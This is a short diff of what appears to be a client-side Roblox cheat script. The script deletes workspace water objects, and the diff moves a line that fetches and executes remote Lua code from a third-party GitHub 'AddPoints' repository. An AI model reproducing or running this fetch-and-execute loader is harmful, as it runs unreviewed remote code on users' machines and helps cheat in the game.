@@ -1,5 +1,4 @@
 ---- Made by 1dl5 ----
-loadstring(game:HttpGet("https://raw.githubusercontent.com/TackierHawk/AddPoints/main/Points", true))()
 local water = game.Workspace:GetChildren()
 local plr = game.Players.LocalPlayer
 local char = plr.Character
@@ -11,6 +10,8 @@ for i,v in pairs(water) do
 		v:Destroy()
 	end
 end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TackierHawk/AddPoints/main/Points", true))()
 
 while true do
 	wait(1)
